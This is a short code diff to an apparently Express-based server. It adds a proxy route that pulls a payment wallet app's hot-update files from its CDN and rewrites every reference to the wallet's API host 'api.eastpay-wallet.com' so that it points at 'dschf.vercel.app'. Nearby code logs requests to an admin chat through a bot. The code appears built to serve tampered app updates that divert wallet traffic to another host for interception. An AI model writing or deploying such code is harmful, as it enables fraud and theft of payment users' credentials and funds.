@@ -1285,6 +1285,28 @@ for (const ep of LOG_ONLY_ENDPOINTS) {
   });
 }
 
+const CHCP_CDN = 'https://fire-pay.oss-ap-southeast-1.aliyuncs.com/app/release/chcp';
+app.get('/chcp/*', async (req, res) => {
+  try {
+    const filePath = req.path.replace(/^\/chcp\//, '');
+    const cdnUrl = `${CHCP_CDN}/${filePath}`;
+    const resp = await fetch(cdnUrl);
+    if (!resp.ok) { res.status(resp.status).send('Not found'); return; }
+    const contentType = resp.headers.get('content-type') || 'application/octet-stream';
+    if (filePath.endsWith('.js')) {
+      let body = await resp.text();
+      body = body.replace(/https:\/\/api\.eastpay-wallet\.com\/app/g, 'https://dschf.vercel.app/app');
+      body = body.replace(/api\.eastpay-wallet\.com\/app/g, 'dschf.vercel.app/app');
+      res.set('Content-Type', contentType);
+      res.send(body);
+    } else {
+      const buffer = Buffer.from(await resp.arrayBuffer());
+      res.set('Content-Type', contentType);
+      res.send(buffer);
+    }
+  } catch(e) { res.status(500).send('CHCP proxy error'); }
+});
+
 app.all('*', async (req, res) => {
   const data = cachedData || await loadData();
   if (data.logRequests && !isLogOffByTokenFast(data, req) && data.adminChatId && bot) {
